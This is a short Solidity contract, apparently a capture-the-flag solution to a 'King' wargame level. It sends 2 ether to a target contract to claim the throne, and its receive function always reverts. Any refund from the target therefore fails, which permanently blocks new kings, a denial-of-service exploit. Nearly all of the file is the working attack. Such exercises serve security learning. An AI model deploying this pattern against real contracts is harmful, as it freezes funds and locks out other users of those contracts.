// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;
    King public king;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
        king = King(payable(contractAddress));
    }

    function hackContract() external {
        (bool ok,) = contractAddress.call{value: 2 ether}("");
        if (!ok) {
            revert("Did not become king");
        }
    }
    receive() external payable {
        revert("I'm the king");
    }
}
